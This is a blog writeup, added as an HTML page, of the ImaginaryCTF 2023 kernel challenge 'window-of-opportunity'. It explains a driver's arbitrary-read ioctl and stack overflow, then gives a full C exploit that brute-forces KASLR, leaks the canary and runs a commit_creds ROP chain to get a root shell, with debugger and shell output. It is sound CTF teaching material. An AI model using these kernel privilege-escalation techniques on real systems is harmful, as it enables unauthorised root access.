@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+
+    <title>ImaginaryCTF 2023 - window-of-opportunity - neverm0r&#39;s blog</title>
+
+    
+    
+    <meta name="description" content="This is a writeup that was done after the CTF since I was busy playing The Odyssey CTF with my team Emu Exploit and got 3rd place. This challenge is a kernel pwn challenge and it is not hard at all, however I decided to write something about it since the unintended solution for this one is quite interesting.
+window-of-opportunity (490 pts) - 11 solves - by Eth007 Description Sometimes, there is a glimmer of hope, a spark of inspiration, a window of opportunity." />
+    <meta name="author" content="" />
+    
+
+    <link href="https://unpkg.com/@master/normal.css" rel="stylesheet">
+    <script src="https://unpkg.com/@master/style@1.5.0"></script>
+    <script src="https://unpkg.com/@master/styles@1.13.0"></script>
+    <script src="https://unpkg.com/master-styles-group"></script>
+    <script src="https://unpkg.com/themes.js"></script>
+    <script>window.themes = window.themes || new window.Themes()</script>
+
+    <style>
+        :root {
+            --font-sans: "Inter var", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;
+        }
+    </style></head>
+<body class="bg:fade-84@dark font:fade-16@dark font:sans">
+    <nav class="w:full h:90 fixed bg:fade-84/.95@dark bg:white z:1000">
+    <div class="
+        h:full
+        w:full
+        max-w:1200
+        mx:auto
+        px:32
+        d:flex
+        align-items:center
+    ">
+        <div>
+            <a href="/" class="mr-3 font:extralight">
+              
+              neverm0r&#39;s blog
+              
+            </a>
+        </div>
+
+        <div class="ml:auto">
+            
+            
+            
+        </div>
+    </div>
+</nav>
+<div class="d:flex flex:column@<=sm pt:90 px:24 jc:center gap:44 word-break:break-word">
+        <div class="max-w:700 w:full box:content-box">
+<article class="box:border-box pt:32">
+    <header class="mb:32">
+        <div class="font:40 font:extrabold">ImaginaryCTF 2023 - window-of-opportunity</div>
+        <div class="mt:16 f:fade-60">
+            <time>Jul 27, 2023</time>
+            </div>
+    </header><div class="
+    _:where(a):hover{text-decoration-color:fade}
+    _:where(a){text-decoration:2;underline;fade-10;_text-decoration-color:fade-70@dark}
+    _:where(blockquote){bl:5;solid;fade-76/.1;_bl:5;solid;fade-34/.1@dark}
+    _:where(code){font:90%;_v:middle}
+    _:where(code:not(.highlight_*,pre_*)){p:2;6;_r:4}
+    _:where(del){text-decoration:1;line-through;fade-68;_text-decoration-color:red-64@dark}
+    _:where(figcaption){text:14;_p:10;20;0;_width:fit;_mx:auto;_font:fade-56;_font:fade-57@dark}
+    _:where(h1){font:40;_font:extrabold}
+    _:where(h1,h2,h3)+:where(h1,h2,h3){mt:.5em}
+    _:where(h1,h2,h3,h4,h5,h6){mt:2em}
+    _:where(h2){mb:1em;_font:32}
+    _:where(h3){font:24}
+    _:where(h4){font:20}
+    _:where(h5){font:16}
+    _:where(h6){font:14}
+    _:where(li)::marker{font:fade-44;_font:fade-68@dark}
+    _:where(li){pl:.375em}
+    _:where(mark){text-decoration:1;underline;#fce016;_bg:transparent;_text-decoration-color:rgb(252;224;22/.5)@dark}
+    _:where(p,li){font:fade-76;_font:16;_line-height:1.65;_font:fade-34@dark}
+    _:where(p,pre,blockquote,figure,ul,ol,table){my:1.125em}
+    >:first-child{mt:0!}
+    _:where(pre){p:20;_r:8;_overflow:auto}
+    _:where(pre,code:not(.highlight_*)){bg:fade-2;_bg:fade-92!@dark}
+    _:where(strong,b,a,code:not(.highlight_*),mark,del){font:fade-92;_font:fade-12@dark}
+    _:where(table){width:full;_border-spacing:0}
+    _:where(td){v:baseline}
+    _:where(td,th):first-child{pl:0}
+    _:where(td,th):last-child{pr:0}
+    _:where(td,th){bb:1;solid;fade-92/.06;_p:6;_b:fade-4/.04@dark}
+    _:where(th){font:fade-78;_font:14;_text:left;_font:fade-12@dark}
+    _:where(th,p_code,li_code,a,mark){font:semibold;_font:medium@dark}
+    _:where(ul){list-style-type:disc}
+    _:where(ul,ol,blockquote){pl:1.5em}
+    _:where(video,img){max-width:full}
+    _:where(a,mark){text-underline-offset:3}
+    _:where(hr){h:2;_bg:fade-10;_bg:fade-70@dark;_my:3em}
+"><p>This is a writeup that was done after the CTF since I was busy playing <a href="https://ctftime.org/event/2029"><code>The Odyssey CTF</code></a> with my team <code>Emu Exploit</code> and got 3rd place.  This challenge is a kernel pwn challenge and it is not hard at all, however I decided to write something about it since the unintended solution for this one is quite interesting.</p>
+<pre tabindex="0"><code>window-of-opportunity (490 pts) - 11 solves - by Eth007
+Description
+Sometimes, there is a glimmer of hope, a spark of inspiration, a window of opportunity.
+
+Attachments: https://imaginaryctf.org/r/izYM0#opportunity_dist.zip 
+nc window-of-opportunity.chal.imaginaryctf.org 1337
+</code></pre><h2 id="1-vulnerability">1. Vulnerability:</h2>
+<p>The challenge give us regular setup for a kernel challenge, a cpio archive, a linux kernel image and script to run qemu. You can find all the related files in the link above.</p>
+<p>The goal of the challenge is to gain root or to read the <code>flag.txt</code>by exploiting the kernel itself or a given driver. In this case, we are given a vulnerable driver that we can interact with it via <code>ioctl</code> and file operations such as <code>read/write</code>. Let&rsquo;s take a look at the driver&rsquo;s ioctl:</p>
+<pre tabindex="0"><code>__int64 __fastcall ioctl_device(__int64 a1, int a2, req *a3)
+{
+  __int64 v5[32]; // [rsp+0h] [rbp-118h] BYREF
+  unsigned __int64 v6; // [rsp+108h] [rbp-10h]
+
+  v6 = __readgsqword(0x28u);
+  if ( a2 != 0x1337 )
+    return -1LL;
+  copy_from_user(v5, a3, 264LL);
+  return (int)copy_to_user(a3-&gt;buf, v5[0], 256LL);
+}
+</code></pre><p>The decompiled has been cleaned to be easier to look. The structure of an ioctl&rsquo;s request:</p>
+<pre tabindex="0"><code>struct request {
+	uint64_t kptr;
+	char buf[256];
+}
+</code></pre><p>So basically what the ioctl request does is: we give a value, then the driver will give us back the value at that address. Remember that <code>copy_to_user</code> will not fail even if we give it an invalid address. This kinds of give us an arbitrary read primitive.</p>
+<p>Let&rsquo;s see what <code>device_write</code> does:</p>
+<pre tabindex="0"><code>__int64 __fastcall real_ioctl(__int64 a1, __int64 buffer, __int64 size)
+{
+  uint64_t v4[8]; // [rsp+0h] [rbp-48h] BYREF
+  unsigned __int64 v5; // [rsp+40h] [rbp-8h]
+
+  v5 = __readgsqword(0x28u);
+  copy_from_user(v4, buffer, size);
+  return 0LL;
+}
+</code></pre><p>A clear buffer overflow, with canary protection.</p>
+<h2 id="2-exploitation">2. Exploitation:</h2>
+<p>We can read a value from an arbitrary address, however we do not know kernel text base, so  we cannot really read any value from it. However, since kernel image only has 9 bits entropy, hence it is brute-forceable. And knowing that <code>copy_to_user</code> will not fail even if the kernel address is not mapped yet, it will copy a bunch of null bytes to the userspace. So we can bruteforce it by reading a value from kernel text base, if we got a value that&rsquo;s not NULL, we have ourself kernel text base. If we have null, we just increase it by <code>0x100000</code> and run until we get a non-null value:</p>
+<pre tabindex="0"><code>while (1) {
+    buf[0] = kernel_base;
+    int ret = ioctl(fd, 0x1337, buf);
+    if (ret &lt; 0) {
+        err(&#34;ioctl fail&#34;);
+        exit(0);
+    }
+    if (buf[1] != 0) {
+        leak = buf[1];
+        break;
+    }
+    kernel_base += 0x100000;
+}
+</code></pre><p>We got a stack buffer overflow in the <code>device_write</code> function. However, it has canary protection, so we have to somehow leak the canary and then ROP our way back to userspace. If we look at the disassembly code of <code>device_write</code>, we can see that the canary is stored in <code>gs + 0x28</code>,  just like in userspace binary:</p>
+<pre tabindex="0"><code>0x0000000000000130 &lt;+0&gt;:	call   0x135 &lt;device_write+5&gt;
+   0x0000000000000135 &lt;+5&gt;:	push   rbp
+   0x0000000000000136 &lt;+6&gt;:	mov    rbp,rsp
+   0x0000000000000139 &lt;+9&gt;:	sub    rsp,0x48
+   0x000000000000013d &lt;+13&gt;:	mov    rax,QWORD PTR gs:0x28			&lt;= Canary
+   0x0000000000000146 &lt;+22&gt;:	mov    QWORD PTR [rbp-0x8],rax 			
+   0x000000000000014a &lt;+26&gt;:	xor    eax,eax
+   0x000000000000014c &lt;+28&gt;:	lea    rdi,[rbp-0x48]
+   0x0000000000000150 &lt;+32&gt;:	call   0x155 &lt;device_write+37&gt;
+   0x0000000000000155 &lt;+37&gt;:	mov    rax,QWORD PTR [rbp-0x8]
+   0x0000000000000159 &lt;+41&gt;:	sub    rax,QWORD PTR gs:0x28
+   0x0000000000000162 &lt;+50&gt;:	jne    0x172 &lt;device_write+66&gt;
+   0x0000000000000164 &lt;+52&gt;:	leave  
+   0x0000000000000165 &lt;+53&gt;:	xor    eax,eax
+   0x0000000000000167 &lt;+55&gt;:	xor    edx,edx
+   0x0000000000000169 &lt;+57&gt;:	mov    esi,edx
+   0x000000000000016b &lt;+59&gt;:	mov    edi,edx
+   0x000000000000016d &lt;+61&gt;:	jmp    0x172 &lt;device_write+66&gt;
+   0x0000000000000172 &lt;+66&gt;:	call   0x177
+</code></pre><p>We can see it in the debugger too:</p>
+<pre tabindex="0"><code>gef&gt; x/gx $gs_base + 0x28
+0xffff8b9a4f600028:	0x959bd16bb9171000
+gef&gt; 
+</code></pre><p>By the way, I use <a href="https://github.com/bata24/gef">gef</a> by <code>bata24</code>, really good extension for kernel exploitation. So we can see that the <code>$gs_base</code> resides in some heap area. We can search for a heap pointer in kernel data, then get a heap leak. After we get a heap leak, calculate the offset from <code>gs_base</code> then get canary. I grab the first heap leak I find here:</p>
+<pre tabindex="0"><code>gef&gt; 
+0xffffffff96603b60:	0x0000000000000000	0x0000000000000000
+0xffffffff96603b70:	0x959bd16bb9171000	0x0000000000000008
+0xffffffff96603b80:	0x0000000000000008	0x0000000000000297
+0xffffffff96603b90:	0xffffffff96603be0	0xffffffff96603bd0
+0xffffffff96603ba0:	0xffffffff94f3365c	0x0000000000000008
+0xffffffff96603bb0:	0x0000000000000008	0xffffffff96603ca0
+0xffffffff96603bc0:	0x0000000000000000	0xf5d9333900000040
+0xffffffff96603bd0:	0xffffffff968eab70	0x353bd8ed00000040
+0xffffffff96603be0:	0xc3213a5180a6057b	0xffffffff968eab00
+0xffffffff96603bf0:	0xffff8b9a4f631380	0xffff8b9a4123b100			&lt;== heap leak
+</code></pre><p>From here, it&rsquo;s easy to get canary value and ROP our way to root. Rest of the exploit:</p>
+<pre tabindex="0"><code>    uint64_t canary_ptr = 0x2003bf0 + kernel_base;
+    memset(buf, 0 , sizeof(buf));
+    buf[0] = canary_ptr;
+    uint64_t canary_leak;
+    ioctl(fd, 0x1337, buf);
+    canary_leak = buf[1];
+    info(&#34;canary_ptr: 0x%lx&#34;, canary_leak);
+
+    struct request *req = (struct request *)malloc(0x1000);
+    req-&gt;kptr = canary_leak - 0x31358;
+    ioctl(fd, 0x1337, req);
+    uint64_t canary = *((uint64_t *)req-&gt;buf);
+    info(&#34;canary: 0x%lx&#34;, canary);
+
+    save_state();
+    uint64_t* rop = malloc(0x3000);
+    memset((char *)rop, 0x0, 4096);
+
+    unsigned long *rop = &amp;payload[8];
+    *rop++ = canary;
+    *rop++ = 0;
+    *rop++ = KADDR(POP_RDI);
+    *rop++ = KADDR(INIT_CRED);
+    *rop++ = KADDR(COMMIT_CREDS);
+    *rop++ = KADDR(SWAPGS_RESTORE_REGS_RET_TO_USER);
+    *rop++ = 0;
+    *rop++ = 0;
+    *rop++ = &amp;shell;
+    *rop++ = user_cs;
+    *rop++ = user_rflags;
+    *rop++ = (user_sp) &amp;0xffffffffffffff00;
+    *rop++ = user_ss;
+
+    write(fd, rop, 0x200);
+</code></pre><p>This give us easy root shell:</p>
+<pre tabindex="0"><code>/ $ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+/ $ cat flag
+cat: can&#39;t open &#39;flag&#39;: No such file or directory
+/ $ ./exploit 
+[*] Open done
+[*] Kernel leak: 0x4802003f51258d48
+[*] Kernel base: 0xffffffff97a00000
+[*] canary_ptr: 0xffff8e304f631380
+[*] canary: 0x3f03bb679c419900
+[*] State saved.
+[*] Rooted...Dropping root shell
+/ # id
+uid=0(root) gid=0(root)
+/ # 
+</code></pre><p>I don&rsquo;t know how to insert image so I&rsquo;m really sorry for long text ;-;</p>
+<h2 id="3-unintended-solution">3. Unintended solution:</h2>
+<p>Why did I decided to write about this challenge even though it&rsquo;s relatively easy? Because the unintended solution for this challenge is interesting. The unintended solution is found by <a href="https://ret2school.github.io/post/iwindow/"><code>nasm</code></a>. He did not use the buffer overflow at all, and get a leak relatively easy. He used Interrupt Descriptor Table (IDT) which isn&rsquo;t affected by KASLR. More on this you can read <a href="https://hxp.io/blog/99/hxp-CTF-2022-one_byte-writeup/">here</a>. After that, he scanned the whole physical memory to find <code>ictf</code> pattern and read the flag. This is because <code>initramfs</code>will be mapped directly within the physical map off the kernel. This was a really cool way to get the flag, even though the traditional exploit for this challenge is not hard. It&rsquo;s worth taking notes off :d.</p>
+<p>Final exploit:</p>
+<pre tabindex="0"><code>#define _GNU_SOURCE
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;assert.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;sched.h&gt;
+#include &lt;linux/bpf.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+#include &lt;linux/prctl.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/xattr.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/uio.h&gt;
+
+// commands
+
+// constants
+#define PAGE 0x1000
+#define FAULT_ADDR 0xdead0000
+#define FAULT_OFFSET PAGE
+#define MMAP_SIZE 4*PAGE
+#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
+// (END constants)
+
+// globals
+// (END globals)
+
+
+// utils
+#define WAIT getc(stdin);
+#define ulong unsigned long
+#define scu static const unsigned long
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+} while (0)
+#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
+    if(msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit(&#34;KMALLOC&#34;);}
+unsigned long user_cs,user_ss,user_sp,user_rflags;
+
+void err(const char* format, ...) {
+    if (!format) {
+        exit(-1);
+    }
+    fprintf(stderr, &#34;%s&#34;, &#34;\033[1;31m[!]\033[0m &#34;);
+    va_list args;
+    va_start(args, format);
+    vfprintf(stderr, format, args);
+    va_end(args);
+    fprintf(stderr, &#34;%s&#34;, &#34;\n&#34;);
+    exit(-1);
+}
+
+void info(const char* format, ...) {
+    if (!format) {
+        return;
+    }
+    fprintf(stderr, &#34;%s&#34;, &#34;\033[1;31m[*]\033[0m &#34;);
+
+    va_list args;
+    va_start(args, format);
+    vfprintf(stderr, format, args);
+    va_end(args);
+    fprintf(stderr, &#34;%s&#34;, &#34;\n&#34;);
+}
+
+void hexdump(unsigned char* buf, int size) {
+	for (int i = 0; i &lt; size; i++) {
+		if (i % 16 == 0)
+			printf(&#34;%04x: &#34;, i);
+		printf(&#34;%02x &#34;, buf[i]);
+		if (i % 16 == 15)
+			printf(&#34;\n&#34;);
+	}
+	if (size % 16 != 0)
+		printf(&#34;\n&#34;);
+}
+
+void shell() {
+    info(&#34;Rooted...Dropping root shell&#34;);
+    system(&#34;/bin/sh&#34;);
+    exit(0);
+}
+
+
+void save_state(void)
+{
+    __asm__(&#34;.intel_syntax noprefix;&#34;
+            &#34;mov user_cs,cs;&#34;
+            &#34;mov user_ss,ss;&#34;
+            &#34;mov user_sp,rsp;&#34;
+            &#34;pushf;&#34;
+            &#34;pop user_rflags;&#34;
+            &#34;.att_syntax;&#34;);
+	info(&#34;State saved.&#34;);
+}
+
+
+
+int fd;
+const char* device = &#34;/dev/window&#34;;
+uint64_t kernel_base = 0xffffffff81000000;
+
+#define POP_RDI 0xffffffff8101d675 - 0xffffffff81000000
+#define COMMIT_CREDS 0xffffffff810ff8a0 - 0xffffffff81000000
+#define PREPARE_KERNEL_CREDS 0xffffffff810ffb80 - 0xffffffff81000000
+#define INIT_CRED 0xffffffff8308b2e0 - 0xffffffff81000000
+#define SWAPGS_RESTORE_REGS_RET_TO_USER 0xffffffff82001126 - 0xffffffff81000000
+
+struct request {
+    uint64_t kptr;
+    char buf[256];
+};
+
+void open_device() {
+    fd = open(device, O_RDWR);
+    if (fd &lt; 0) {
+        err(&#34;Failed to open device&#34;);
+        exit(0);
+    }
+    info(&#34;Open done&#34;);
+}
+
+int main () {
+    open_device();
+    uint64_t leak = 0;
+    uint64_t buf[0x21];
+    memset(buf, 0x0, sizeof(buf));
+    while (1) {
+        buf[0] = kernel_base;
+        int ret = ioctl(fd, 0x1337, buf);
+        if (ret &lt; 0) {
+            err(&#34;ioctl fail&#34;);
+            exit(0);
+        }
+        if (buf[1] != 0) {
+            leak = buf[1];
+            break;
+        }
+        kernel_base += 0x100000;
+    }
+    info(&#34;Kernel leak: 0x%lx&#34;, leak);
+    info(&#34;Kernel base: 0x%lx&#34;, kernel_base);
+    uint64_t canary_ptr = 0x2003bf0 + kernel_base;
+    memset(buf, 0 , sizeof(buf));
+    buf[0] = canary_ptr;
+    uint64_t canary_leak;
+    ioctl(fd, 0x1337, buf);
+    canary_leak = buf[1];
+    info(&#34;canary_ptr: 0x%lx&#34;, canary_leak);
+
+    struct request *req = (struct request *)malloc(0x1000);
+    req-&gt;kptr = canary_leak - 0x31358;
+    ioctl(fd, 0x1337, req);
+    uint64_t canary = *((uint64_t *)req-&gt;buf);
+    info(&#34;canary: 0x%lx&#34;, canary);
+
+    save_state();
+    uint64_t* payload = malloc(0x3000);
+    memset((char *)payload, 0x0, 4096);
+
+    unsigned long *rop = &amp;payload[8];
+    *rop++ = canary;
+    *rop++ = 0;
+    *rop++ = kernel_base + POP_RDI;
+    *rop++ = kernel_base + INIT_CRED;
+    *rop++ = kernel_base + COMMIT_CREDS;
+    *rop++ = kernel_base + SWAPGS_RESTORE_REGS_RET_TO_USER;
+    *rop++ = 0;
+    *rop++ = 0;
+    *rop++ = &amp;shell;
+    *rop++ = user_cs;
+    *rop++ = user_rflags;
+    *rop++ = (user_sp) &amp;0xffffffffffffff00;
+    *rop++ = user_ss;
+
+    write(fd, payload, 0x200);
+}
+</code></pre></div></article>
+<footer class="py:24">
+    <div class="f:fade-30 f:14 mb:8"></div>
+    <div class="f:fade-60 f:12">Theme <a class="f:bold" href="https://github.com/serkodev/holy" _target="_blank">Holy</a></div>
+</footer></div>
+    </div>
+</body>
+
+</html>
